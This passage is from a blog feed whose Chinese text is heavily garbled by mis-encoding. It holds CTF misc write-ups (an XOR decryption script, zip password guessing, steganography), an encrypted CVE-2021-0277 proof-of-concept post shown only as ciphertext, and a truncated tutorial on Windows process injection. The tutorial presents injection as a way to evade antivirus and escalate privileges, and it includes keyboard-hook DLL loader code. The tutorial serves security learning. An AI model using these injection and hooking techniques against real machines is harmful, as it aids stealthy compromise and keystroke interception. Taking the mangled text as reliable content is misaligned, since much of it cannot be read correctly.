open(&#39;.&#x2F;flag.zip&#39;, &#39;rb&#39;).read()new &#x3D; open(&#39;.&#x2F;fffflllaag.dat&#39;, &#39;ab&#39;)letter &#x3D; &#39;&#39;secret &#x3D; int(letter,16)print(secret) k1eAn for i in f:    n &#x3D; int(i) ^ secret    new.write(int(n).to_bytes(1, &#39;big&#39;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>å’Œpasswd ??K1eAn??? è¿™é‡Œæœ‰äº”ä¸ªæ•°å­—ä¸çŸ¥é“ã€‚</p><p>ç„¶åç”¨å·¥å…·æœäº†ä¸€ä¸‹flagæ–‡ä»¶ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œdumpå‡ºå£é‡Œé¢å­˜äº†</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-c976b15ac7a25d56c78d58c224c7d05dae18551f.png" alt="å›¾ç‰‡.png"></p><p>è¿™ä¸ªå°±æ˜¯åŠ å¯†ä¹‹åçš„ä¸œè¥¿ï¼Œéœ€è¦æˆ‘ä»¬æ‰¾åˆ°letterè¿˜åŸå‡ºflag.zipï¼Œå•Šè¿™é‡Œæƒ³åˆ°ä¹‹å‰æœ‰ä¸ªå›¾ç‰‡ï¼Œç„¶åæœå›¾ç‰‡ï¼Œï¼Œç„¶ådumpå‡ºæ¥ï¼Œæ‹¿åˆ°å›¾ç‰‡</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-368bed714433476487e5dc2dbf15b93fdb704dab.png" alt="å›¾ç‰‡.png"><br>ä»¥ä¸ºæ˜¯pngéšå†™ï¼Œåæ­£letterè‚¯å®šåœ¨è¿™é‡Œï¼Œä½†æ˜¯æˆ‘æ²¡æœ‰è§£å‡ºæ¥ï¼Œï¼ˆé—®äº†åˆ«çš„å¸ˆå‚…ï¼Œå¥½åƒæ˜¯å•¥æ©¡æ ‘ç½®æ¢ï¼Œåæ­£æˆ‘ä¹Ÿåªæ˜¯ä¸šä½™çš„miscé€‰æ‰‹ã€‚ä¸å¤ªæ‡‚ï¼‰ï¼Œäºæ˜¯æˆ‘æƒ³åˆ°äº†dataåŠ å¯†çš„æ—¶å€™ï¼Œæ˜¯ä¸€ä¸ªä¸€ä¸ªå­—èŠ‚å†™çš„ï¼Œäºæ˜¯æˆ‘ç›´æ¥çˆ†ç ´äº†127ä¸ªå¯è§å­—ç¬¦ä¸²ï¼Œåœ¨ç¬¬åä¸ªæ‹¿åˆ°äº†flag.zip</p><p>flag.zipè¿˜æ‰“ä¸å¼€ï¼Œè¦å¯†ç ï¼Œè¿™æ—¶å€™æˆ‘åˆæƒ³åˆ°äº†passwdã€‚æœ¬æ¥æ˜¯æ©ç çˆ†ç ´çš„ï¼Œåæ¥çœ‹æ—¶é—´å¤ªé•¿äº†ã€‚æˆ‘ä¸€çœ‹å“‡ï¼Œä¸å°±æ˜¯ankleå†™ä¸¤éå—<br>Ank1eAnk1eï¼Œç„¶åå°±å‡ºäº†ï¼Œé‡Œé¢æ˜¯ä¸ªtxt</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-62e333920aa772e310205dba52eb64aa2866d5e3.png" alt="å›¾ç‰‡.png"></p><p>ç„¶åå°±å¼€å§‹äº†å¯¹è„‘ç”µæ³¢çš„è¿‡ç¨‹ï¼Œï¼Œï¼Œ<br>çŸ¥é“æˆ‘æ‰«äº†ä¸€écmdlineã€‚ã€‚ã€‚å‘ç°äº†æœ‰ä¸ªegg1.rtf<br>dumpå‡ºæ¥ä¹‹å</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-704658b7d06eccd1b2725af87e264f90940dda4d.png" alt="å›¾ç‰‡.png"><br>ç„¶åå°±å‡ºäº†<br>flag=md5{You are the only weakness in my body}</p><h3 id="misc2-zipcracker2"><a class="header-anchor" href="#misc2-zipcracker2">Â¶</a>misc2 zipcracker2</h3><p>ä¸å†™äº†ä¼ªåŠ å¯†å’Œæ˜æ–‡æ”»å‡»ä¸€æŠŠæ¢­</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-31375225c063062174436f57425c2564cd152f88.png" alt="å›¾ç‰‡.png"></p><h3 id="misc3-pngcracker"><a class="header-anchor" href="#misc3-pngcracker">Â¶</a>misc3 pngcracker</h3><p>è¿™ä¸ªä¹Ÿç®€å•ï¼Œbinwalkå‘ç°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œæ‹‰é•¿pngå¾—åˆ°å‹ç¼©åŒ…å¯†ç ï¼Œç„¶åå‹ç¼©åŒ…é‡Œé¢çš„misc.pngæœ‰lsbéšå†™ï¼Œç›´æ¥å°±å‡ºäº†</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-673596b978977bcfcb09ef245cb23de55cbe72ce.png" alt="å›¾ç‰‡.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ciscn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2021-0277ä»æ¼æ´æŠ¥å‘Šåˆ°pocç¼–å†™</title>
    <link href="/2022/06/29/CVE-2021-0277%E4%BB%8E%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A%E5%88%B0poc%E7%BC%96%E5%86%99/"/>
    <url>/2022/06/29/CVE-2021-0277%E4%BB%8E%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A%E5%88%B0poc%E7%BC%96%E5%86%99/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="å†è¯•è¯•ncçœ‹çœ‹" data-whm="ç¦æ­¢ä¿®æ”¹">  <script id="hbeData" type="hbeData" data-hmacdigest="a58d0161209c9dca4f1c2121c96ac649879b41c317cf84af4e9dc4a85accca2f">cc0c0f8ba411acd26894e584ac9b5fdaa20ff2900fe7d80c1056c5376dd8b1f16568fb63c9a696d03755534cd1d7ec196f73fadd750d880e63e5e3d1bface87acd05a7bf4ecead3817dae235ecc9246793042c197ba0ff4113a30d35450a87af98d972accd703b84aa56be6d552a2cd8596d0b24e157285ff887d412a63787e4ee3279a709a715da068773007bdc33dfeb911fda1bac67aea16cfe4e50406054cd33026c8461c6327c748626056a2f4700127a30ec764275cc63937edf343ea685eafab9aeee5647244ca5369b29f1b30c088994cc15b892da848088f7837223179133e8f06c236c9a830c08f4d9af49236316ac0ae5fcd70c1386f06bd48655d24e09636e335f6f17eea688999deb68c37dd87d160d1b98544d38f54cbd94aad739230796ef716190a45c2859e9db653721bc2860440158b7e84d1d6aa3651e81dcea04a294345470ed70d0ca434e25288f0c222f4d21f4242dae7a4136fed8bc5668ac633d60fc6b12c59d95e15fcb4f9dd15a657d5eb5a7fc4e8610ef51e6d2af1160283aa1e383812cc4d69c766d7f411ae6f53e3b0d8869c09dcf432b27737a296f5e5a0efda3995a49b8716ec05ada25b02c5d9692e37c2d0acfdb26ad00f8d73a0d4263dd4804fd6378caded785ff2a8c94d5ac3e1652a1c01267f5bf88c7ae706462160ba375c65f0c106e254fc98fd6d658550c3fdba67276acaeb9eb934a9a9b576558d293f48092bd3e1c9cec9bd9b5f9ed05ff386120595ea0f4473f6fb431bf32cb9ad8518de1c2e3435a3a05b6e104a8685e8709d72ce363ad5a96395cafff1d2632eec94623ce5f4a4223580742c0cacecc4d1a3516da1b26a596fddaa3c82a955e28d5959e58bed5c7d9e3334853eb326f1955d964382d54372bc60029e7ec40c6f678ddc01bf79d6c1fa799aa2857f4c98a3a829e42f9d441196e9f2a26bdead7894d902b3f3c7a7e41aff83013f696ee2f3a19795b0cf21e6ea559ba01ca4ba008ffe9d2c34c06ee607930aa6ba5d4871783afe4ed2e8286d72884e7583a7d2e33813b5aa133f7cd1a378c8db95710cbd26a182231902bd4754afc9f76cde060a12b82edbb75ae05f24c07aa9f7f030f36581789fd523da8a52d00051226143897b90d376b72299dd1667b84190a4a7a7d38e7eec7db9575b46ddc7b0f5446ca2025597fb023bca97563988d4de8973a303490f5775600eb753f3b8c5efb768a91940be3fe9f8ddf4077fce1b08c45f9a16c3feac2e8822db3af3ed666500ab9aee46126e2064311d40560b19bc73846e118ad2b9696f5b5f095f1c7453f44772ce96de1b8fc9b2f9a7b411f4c3c4ab8cfca332a6ef567f7b211ca81add2dccf2a25aacde09459858db5a41dc75fbbe671b5fee720ee58ae869d4dfa890486c29af1e2e18828ccb4e5f6d295c9321eaae6e51442adc4fa776b93cb5dcc03cc34175a4418e7361f3973844c8cf3c68068b55450cb99990b24fa34eb9b1062fd7da77793d7d0ac718f1ba806bce539de9339b989e14bbfd4f392b196980e4c772d2f08e3cc284c3a81518f278ffc62c8e9767363b3b0d433bde881c838e0b5dcd816a91f95ab8a1061540fcd01f772bec097b49d8fe8547ac2f8a4b6115b407e8aa5a8715f1c70632fde3299a41e19c10bf2827656bdf8be30558c723a33b2d109f461505fb6822501a7e2dca202349add33e021bcc5424c4b053823f4eed3069cc307de0a750d25e6611fb6b7c8ffd1088fc8ec76f1930c88f7d802f1d9f38e8cc7396363da9a37e78fb238bc9a76d14ef725dbba923d878d9ed68f7bb74bcaa300dea83a3b1d2070d982ca28d8195c7c8e9481fc517f4b3edee25647da4340e51a8aefe46fb6ba8398ca5f8885a9b072a2144bf39ef5ba33e89f635f5289938d341c1ab943c11a7c554d2a07c06ab8d17b41f63bcd23903ab56a4c84be49095f0114d0bc31d7119438f24e75e2128170a4fa637674ea291d84c2d9a37881b18ef1195f863d6bd1e15bbf41807f2844bec513ffba0abd672a2b6adc1e892e5606ab991bcf9860cd48853d6e9a60156d3742b3061e679badab1c7565acdc3f4933eb46744dd64f8224a57ea8d24bcf6bf9d0f633f9c57c5348ec87f60679b9009c6328b3e988741552fcbfdbd45ea2363ced7d6de5e3f11f7465497dfca8a915a0ae5fba785d3f02ea0ea9526c8c46276a9f2fc5946e91b559beceffac9d7798c0cbcf2c3565e7226a544b556d78fcd018bce102a1cf8f15a552b42093e8c46d70d295a0e9ddd24197491d0e47eca80c31ebb22ccaf5e7b3375953adf3d5efa335cc71b9ca557e3c14b0f15bd91cfb1a1d74a10ade872c0c5f124b266a37e7aed721247c8cc30edf8f47cf944912f038ac919b8e08ee74aa743eeb9ec0694e3080aacca4602b7c6dd73afa0af775c9780d7a27e06afb9aacbabe52f21c8546c64154ebbec3387d5f558a11709c9858035c649096f774251a43c4b0e6816fbd90f6b9dffae974957bf2c1ff2d12ee2fdf1c41c7a68237555582edd74f1c7dca45f08c7999a5d3b6a27724be87cb591c0076167411723d1c7a81653086fe7e66c90385bb4ea007f49bfc91f2aa6dce06f2ce8eac83a8ea8691d925b4497b101f3711b924db2f77e2656ff305b0a6fbb346d99655a4818d9f703b87ba60d7758ae6c5229679bec12e87b11370927b2eee7efe929f143c46950406bc641b818c3ca8d603157be42a5d51ad836abbd152f42c21278431a3ea144c2f21ca7b29e0e6ffe841145aa752953592dace35d006afbfd9d3956338f0a8a347c4d0d419eb0c506b866b7ac92a3a2bcf83efd432000a69f1f8e763cf33d1649ed9622a95a4c9fe2a1313b5c8f6b8405f6b5c8b3d9ab2d08d265ab72aba20baebaa7e15d5bbdf356923a6ee328483d6faf9770f4224f9cfc52c664a4328023e72b2395979ebbe234eb05f9b95cd147b85c0650f107b75416028fed5b08e7e3006a5ff8902c46bd03119f6a89f3937d7d60021f2331f411c8546a4bbc256259e72492ceb36874065718b6c94d1c6c6a313cad762bc32e97f240989c978348392322831fbcff2c923e5c06b25d31a2095a5f193bd0abeb00a1ee6feb9a884c784d816220424c954e7998d0b99aecdb4675576846227f33acf83d523c9b7ac140a64cb5530bfa0cc51b7bbe58bc55f5e1f373c0e6947fdbed500746e3f9dc31c967b3960c46081446162417892d50e0f20b20887fdcd35ac764ba3bccd4b96da97d3b9b25728ee38f0fadcf19627c6c8f98fdb3a8f47f18891aa1ffdc719bdc50a1ed90234a42ab302c726ef04ec9ef655a32b86bb1745a651faa2f946ef991f7219773a1b904f1e4d3ff7b19a78b4c44e87dcbacfc6bd49f14ec0e6e5b45070399e56fe150ee89a99ca0683dfe59faa05c2440162e6a002ed92e1bb2035bb7bc2d9edba0097ae724215fcdb38fc3d59c834dcca14b66e85fa7c95fb7e506a7fc1fd7a5eb778cbe24300be72ae586e7098ffd08f7064599933a466ef7bd17abe8ecfddf594c2d5adcccfd896c32c3913c8e9136416806be7b5f2eb642dd3453b7c1e3cc6935458d3fbc37a282a55f69d9d315e2b003f6986c3f8112ffc7d1321b90671feb47a01cd8d1eec13f379218e54aeea08ec366cde307d394c0c80a06123d13cb294980e7aec53c28345b1e63c2d1bf667fdae32be3e6bafdcf8a3d5fa4884909b77ea0eaa596b83cb71ab34237bddf687e36d9b6b0fcc8320d3840aeab97caf4629bd28c459e9223a475fdf7a4589c7aab7b266d27ab1d1676b2d200688b4ce3088515cb993a128fb18e673cbadf78793ba712d8d9b7defd83a171866fb8e940bd0f36cd580d58681131e5d713f680ca0470c064655f305102be106955f75b6e313730a96abdc9f844dada90532707a51297eb9150c3c2b14860934023057d1e7e07d459166352c4dc341fc01565784cac2652850b1e62aad401acd272e6489d61ac67a8ab05e3bd27e615f5a2886aacc06275936a7d591aaf26421da69aa06181c2f11f857b94b7eb7d7096ad92671cb3b8f429664bdd44027a37362cbc69b18df9883d6332bb24c823413ab6fb6aff186e0fd08134377c3258bc552b3bd653c02ea1e4bd904ae6ed3ec3ef24563ac9bc7d539ba494d7688129ce1def1507bcd83584eb512891eb687c9f27879e886a4f87e2bdbcb835c4bb98c5fc3d026cd1ac8ddabd84686a7374f54a8fad231037948b3e54294bcb4a8a387bdd57b1d4086ffb2072a53f12f0f6145fa662c9fc750c7af5e1c07db9e323eb81abbc9bae9496a4a1123412d2871f34ce5a6c0a11ae1865f0206a2288ab6b33b73cba3012003a10dd143d27240554f106b343a1c85a108dda5096db3fd475b30a89a62ca6acd24715e719d9efd66f1cf14488f17a62d35c3324f513d50ffe6c4c811f7ccf6e8e8890914d32b0af909369adad27ebfc56c6f99f9d6421d845d8f23634c</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">å·²ç»åœ¨åšäº†ï¼Œå¿«äº†å¿«äº†</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IOT/juniper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä»è¿›ç¨‹æ³¨å…¥åˆ°ææƒ</title>
    <link href="/2022/06/26/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/"/>
    <url>/2022/06/26/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1>ä»è¿›ç¨‹æ³¨å…¥åˆ°ææƒ</h1><p>windowsä¸‹çš„ä¸€ç³»åˆ—æ³¨å…¥æ‰‹æ®µåœ¨å…æ€å’Œææƒä¸Šæœ‰è¾ƒå¤§çš„ç”¨å¤„ï¼Œå­¦ä¹ è¿›ç¨‹æ³¨å…¥å¯¹Windowså®‰å…¨çš„ç†è§£æœ‰é‡è¦çš„å¸®åŠ©ã€‚</p><h2 id="0x01-ä»€ä¹ˆæ˜¯è¿›ç¨‹æ³¨å…¥"><a class="header-anchor" href="#0x01-ä»€ä¹ˆæ˜¯è¿›ç¨‹æ³¨å…¥">Â¶</a>0x01 ä»€ä¹ˆæ˜¯è¿›ç¨‹æ³¨å…¥</h2><p>ç±»ä¼¼äºlinuxä¸‹çš„ROPï¼Œè¿›ç¨‹æ³¨å…¥å³ä¸ºåœ¨ä¸€ä¸ªç‹¬ç«‹æ´»åŠ¨çš„è¿›ç¨‹ä¸­åœ°å€ç©ºé—´æ‰§è¡Œä»»æ„ä»£ç çš„æ–¹å¼ï¼Œæ­¤æ—¶è¢«æ‰§è¡Œçš„ä»»æ„ä»£ç å¯ä»¥è®¿é—®æºè¿›ç¨‹çš„æ‰€æœ‰èµ„æºç©ºé—´ï¼Œå¸¸å¸¸è¢«ç”¨æ¥ææƒï¼ŒåŒæ—¶ï¼Œè¯¥æ–¹å¼é€šè¿‡æ³¨å…¥æ­£å¸¸çš„è¿›ç¨‹ï¼Œå¸¸å¸¸å¯ä»¥ç»•è¿‡æ€è½¯çš„æ£€æµ‹å’Œç™½åå•æ£€æµ‹ã€‚</p><p>ä»åŸç†ä¸Šè®²ï¼Œè¿›ç¨‹æ³¨å…¥æ”¹å–„äº†ä¸å¯è§æ€§ï¼ŒåŒæ—¶ä¸€äº›æŠ€æœ¯ä¹Ÿå®ç°äº†æŒä¹…æ€§ã€‚</p><p>ç›®å‰å¤§è‡´ä¸Šæœ‰ä¸¤ç§æ³¨å…¥æ–¹æ³•ã€‚</p><ul><li>dllæ³¨å…¥</li><li>shellcodeæ³¨å…¥</li></ul><p>ä¸ªäººè®¤ä¸ºåœ¨æœ¬è´¨ä¸Šï¼ŒäºŒè€…éƒ½æ˜¯æ“ä½œç³»ç»Ÿå¯ä»¥æ‰§è¡Œçš„ä»£ç ï¼Œä¸ºäº†æ–¹ä¾¿å¼€å‘ï¼Œä»£ç é€šå¸¸ä¼šä»¥dllçš„å½¢å¼ç¼–è¯‘å’Œä¼ æ’­ï¼Œå®é™…ä¸Šè¿›è¡Œæ³¨å…¥çš„æ—¶å€™ï¼Œä½œä¸ºloadlibraryè¢«åŠ è½½ã€‚</p><p>æ³¨å…¥çš„æ–¹å¼å¤šç§å¤šæ ·ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸»è¦çœ‹åˆ°ä¸¤ç§æ³¨å…¥çš„æ–¹å¼ï¼Œ<strong>dllå’Œpeæ³¨å…¥</strong></p><h2 id="0x02-å‡ ç§è¿›ç¨‹æ³¨å…¥çš„æ–¹å¼"><a class="header-anchor" href="#0x02-å‡ ç§è¿›ç¨‹æ³¨å…¥çš„æ–¹å¼">Â¶</a>0x02 å‡ ç§è¿›ç¨‹æ³¨å…¥çš„æ–¹å¼</h2><h3 id="dllç¼–å†™è§„åˆ™"><a class="header-anchor" href="#dllç¼–å†™è§„åˆ™">Â¶</a>dllç¼–å†™è§„åˆ™</h3><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦äº†è§£ä¸€ä¸‹dllçš„ç¼–å†™è§„åˆ™å’Œä¸€äº›å…·ä½“çš„å®ç°ã€‚</p><p>DLLï¼ˆDynamic Linkable Libraryï¼‰å®ƒæä¾›ä¸€äº›å¯ä»¥ç›´æ¥ä½¿ç”¨çš„å˜é‡ï¼Œç±»å’Œå‡½æ•°ã€‚åœ¨ç»å†äº†â€œæ— åº“â€”é™æ€é“¾æ¥åº“â€”åŠ¨æ€é“¾æ¥åº“â€çš„å†ç¨‹åï¼Œdllä½¿ç”¨ååˆ†å¹¿æ³›ã€‚</p><p><a href="https://blog.csdn.net/W_Y2010/article/details/80428067">https://blog.csdn.net/W_Y2010/article/details/80428067</a></p><p>ç¼–å†™è§„åˆ™å’Œä¹‹å‰å†™è¿‡çš„tinystlå·®ä¸å¤šï¼Œè¯­æ³•ä¹Ÿæ˜¯å•çº¯çš„cè¯­è¨€è¯­æ³•ã€‚æœ‰ä¸€ç‚¹ä¸ä¸€æ ·çš„æ˜¯</p><p><img src="https://i.bmp.ovh/imgs/2022/06/27/2bb043f58574f84d.png" alt=""></p><p>å‡½æ•°çš„è¿”å›å€¼ä½¿ç”¨dllçš„extern å£°æ˜ï¼Œè¡¨æ˜åé¢çš„å‡½æ•°æ˜¯dllçš„å¯¼å‡ºå‡½æ•°ã€‚åŸºæœ¬ç”¨æ³•å°±æ˜¯è¿™æ ·è¿˜æœ‰ä¸€äº›åˆ«çš„ç”¨æ³•ä¸èµ˜è¿°ï¼Œæœ¬æ¬¡çš„é‡ç‚¹æ˜¯å¼„æ˜ç™½dllæ³¨å…¥å’Œhookæ³¨å…¥å’Œpeæ³¨å…¥ä¸‰ç§æ–¹å¼ã€‚</p><h3 id="hookæ³¨å…¥åŸç†"><a class="header-anchor" href="#hookæ³¨å…¥åŸç†">Â¶</a>hookæ³¨å…¥åŸç†</h3><p>ä»€ä¹ˆæ˜¯hookå‘¢ï¼Ÿè”æƒ³glibcä¸­çš„hookï¼Œè°ƒç”¨mallocå’Œfreeä¹‹å‰ä¼šæŸ¥çœ‹å…¶ä¸­çš„hookã€‚å®é™…ä¸ŠæŠ½è±¡å‡ºæ¥ï¼ŒWindowsä¸‹çš„hookæœºåˆ¶ä¹Ÿå’Œå…¶ç±»ä¼¼ã€‚</p><blockquote><p>hookä½œä¸ºä¸€ç§æ¶ˆæ¯ç›‘å¬æœºåˆ¶ï¼Œç¨‹åºå¯ä»¥é€šè¿‡hookå¯¹æ¶ˆæ¯æˆ–çª—å£è¿›è¡Œç›‘å¬ï¼Œï¼Œå³hookå¯ä»¥å’Œç‰¹å®šçš„æ—¶é—´æŒ‚é’©ï¼Œå½“åº”ç”¨ç¨‹åºè§¦å‘è¯¥ç‰¹æ®Šäº‹ä»¶ä¹‹åï¼Œæ“ä½œç³»ç»Ÿå³ä¼šå‘hookå‘å‡ºé€šçŸ¥æ¶ˆæ¯ï¼Œæ­¤æ—¶hookå‡½æ•°å°±ä¼šå“åº”å¯¹åº”çš„æ¶ˆæ¯ã€‚</p></blockquote><p><img src="https://i.bmp.ovh/imgs/2022/06/27/2974a5f11e3b5ba7.png" alt=""></p><p>è¿™é‡Œå€Ÿç”¨åˆ«äººçš„å›¾æ¥è§£é‡Šä¸€ä¸‹é’©å­çš„æœºåˆ¶ï¼Œ åœ¨Micrisoft Windowsä¸­ï¼Œ æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„ç§æœ‰åœ°å€ç©ºé—´ã€‚å½“æˆ‘ä»¬ç”¨æŒ‡é’ˆæ¥å¼•ç”¨å†…å­˜çš„æ—¶å€™ï¼ŒæŒ‡é’ˆçš„å€¼è¡¨ç¤ºçš„æ˜¯è¿›ç¨‹è‡ªå·±çš„è‡ªåˆ¶ç©ºé—´çš„ä¸€ä¸ªå†…å­˜åœ°å€ã€‚è¿›ç¨‹ä¸èƒ½åˆ›å»ºä¸€ä¸ªæŒ‡é’ˆæ¥å¼•ç”¨å±äºå…¶ä»–è¿›ç¨‹çš„å†…å­˜ã€‚</p><p>è¿™æ ·è™½ç„¶ä¸€å®šç¨‹åº¦ä¸Šä¿è¯äº†ç¨‹åºçš„å®‰å…¨æ€§ï¼Œä½†æ˜¯å´ä¹Ÿä½¿æˆ‘ä»¬å¾ˆéš¾ç¼–å†™èƒ½å¤Ÿä¸å…¶ä»–è¿›ç¨‹é€šä¿¡çš„åº”ç”¨ç¨‹åºæˆ–å¯¹å…¶ä»–è¿›ç¨‹è¿›è¡Œæ“æ§çš„åº”ç”¨ç¨‹åºã€‚</p><p>hookå°±è¢«ç”¨æ¥å†è¢«è°ƒç”¨å‡½æ•°å’Œè°ƒç”¨è¿›ç¨‹ä¸­å……å½“ä¸€ä¸ªä¸­é—´äººï¼Œç”¨æ¥æ¥å—æ¶ˆæ¯ï¼Œå¤„ç†æ¶ˆæ¯å’Œè½¬å‘æ¶ˆæ¯ã€‚</p><p>Hookçš„ç±»å‹åœ¨Windowsä¸‹ä¹Ÿæœ‰å¾ˆå¤šç§ï¼Œæ¶ˆæ¯hookï¼Œæ³¨å…¥hookï¼Œinlineå†…è”hookç­‰ï¼Œhookæ³¨å…¥ä¸­ï¼Œ<strong>é‡ç‚¹å­¦ä¹ çš„æ˜¯å…¶ä¸­çš„æ³¨å…¥hook</strong>ï¼Œ<strong>æ³¨å…¥hook</strong>ï¼Œå’Œhjackingå·®ä¸å¤šï¼Œå°±æ˜¯åŠ«æŒAPIçš„è°ƒç”¨å‡½æ•°ã€‚</p><p>ä½†æ˜¯å‰é¢è¯´äº†ï¼Œæ¯ä¸ªè¿›ç¨‹æœ‰ä¸€ä¸ªç§æœ‰çš„å†…å­˜ç©ºé—´ï¼Œé‚£ä¹ˆæˆ‘å¦‚æœæƒ³è¦Aè¿›ç¨‹hookBè¿›ç¨‹çš„å‡½æ•°ï¼Œä½†æ˜¯Aåˆä¸å¯ä»¥ç›´æ¥è®¿é—®Bçš„å†…å­˜ç©ºé—´ï¼Œé‚£ä¹ˆåº”è¯¥æ€ä¹ˆåŠï¼Ÿ</p><p>è¿™ä¸ªæ—¶å€™è€ƒè™‘åˆ°dllåŠ¨æ€é“¾æ¥åº“çš„æ³¨å…¥æŠ€æœ¯ï¼Œhookå’Œdllæ³¨å…¥ç»“åˆå³å¯è§£å†³è¿™ä¸ªé—®é¢˜ã€‚<strong>æŠŠhookçš„ä»£ç å†™å…¥dllä¸­ï¼Œè®©Bç¨‹åºåŠ è½½dllï¼Œåˆ™hookå³å¯ç”Ÿæ•ˆ</strong>ï¼Œä¹ä¸€çœ‹æ„Ÿè§‰è¿˜ä¸å¦‚ç›´æ¥shellcodeæ¥çš„å®åœ¨ã€‚ä¸€èˆ¬çš„æ³¨å…¥æµç¨‹å¦‚ä¸‹ï¼š</p><ol><li>å®‰è£…ä¸€ä¸ªé’©å­ï¼ˆç³»ç»Ÿçš„dllæ³¨å…¥è¢«hookï¼‰</li><li>ä¿å­˜ç³»ç»Ÿå‡½æ•°å…¥å£å¤„çš„ä»£ç </li><li>æ›¿æ¢æ‰è¿›ç¨‹ä¸­çš„ç³»ç»Ÿå‡½æ•°å…¥å£æŒ‡å‘æˆ‘ä»¬çš„å‡½æ•°ï¼ˆç›´æ¥ä¿®æ”¹åœ°å€ç©ºé—´çš„å­—èŠ‚ï¼‰</li><li>å½“ç³»ç»Ÿå‡½æ•°è¢«è°ƒç”¨æ—¶ç«‹å³è·³è½¬åˆ°æˆ‘ä»¬çš„å‡½æ•°</li><li>å‡½æ•°å¤„ç†</li><li>æ¢å¤ç³»ç»Ÿå‡½æ•°å…¥å£çš„ä»£ç ï¼ˆå¤„ç†åæ‹–é’©ï¼‰</li></ol><p>è¿™æ—¶å€™æˆ‘ä»¬å›å»çœ‹åˆ°ç»™çš„å®éªŒä»£ç ï¼š</p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/420c2138c2b9725b.png" alt=""></p><p>æœ‰ä¸¤ä¸ªcppå‡½æ•°ï¼Œkeyhookæ˜¯ç¼–è¯‘æˆdllçš„cppï¼Œä¸Šé¢æ˜¯hookç¨‹åºçš„exeï¼Œä¹Ÿå³æ˜¯Aç¨‹åºã€‚</p><p>å®ç°çš„å†…å®¹æ˜¯ï¼Œç”¨é”®ç›˜hookæŠ€æœ¯æ‹¦æˆªnotepad.exeè¿›ç¨‹çš„é”®ç›˜æ¶ˆæ¯ï¼Œä½¿ä¹‹æ— æ³•æ˜¾ç¤ºåœ¨è®°äº‹æœ¬ä¸­</p><figure><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;&#x2F;HookMain#include &quot;stdio.h&quot;#include &quot;conio.h&quot;#include &quot;windows.h&quot;#defineDEF_DLL_NAME&quot;KeyHook.dll&quot;#defineDEF_HOOKSTART&quot;HookStart&quot;#defineDEF_HOOKSTOP&quot;HookStop&quot;typedef void (*PFN_HOOKSTART)();typedef void (*PFN_HOOKSTOP)();void main()&#123;HMODULEhDll &#x3D; NULL; &#x2F;&#x2F;ä»£è¡¨åº”ç”¨ç¨‹åºè½½å…¥çš„æ¨¡å—,è¢«è½½å…¥æ¨¡å—çš„çº¿æ€§åœ°å€PFN_HOOKSTARTHookStart &#x3D; NULL;PFN_HOOKSTOPHookStop &#x3D; NULL;charch &#x3D; 0;    &#x2F;&#x2F; åŠ è½½æŒ‡å®šçš„dllhDll &#x3D; LoadLibraryA(DEF_DLL_NAME);    if( hDll &#x3D;&#x3D; NULL )    &#123;        printf(&quot;LoadLibrary(%s) failed!!! [%d]&quot;, DEF_DLL_NAME, GetLastError());        return;    &#125;HookStart &#x3D; (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART);HookStop &#x3D; (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);HookStart();    printf(&quot;press &#39;q&#39; to quit!\n&quot;);while( _getch() !&#x3D; &#39;q&#39; );HookStop();    FreeLibrary(hDll);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>æœ‰ä¸€äº›éŸ©æ–‡æ³¨é‡Šï¼Œåˆ æ‰äº†ã€‚çœ‹çš„æœ‰ç‚¹ç‚¹ä¸å¤ªæ‡‚ï¼Œå¯èƒ½éœ€è¦çœ‹å®Œdlléƒ¨åˆ†æ‰æ‡‚ã€‚</p><p>å¤§è‡´é€»è¾‘å°±æ˜¯ï¼Œå…ˆåŠ è½½ç›®æ ‡dllï¼Œç„¶ååˆ©ç”¨<code>GetProcAddress</code> 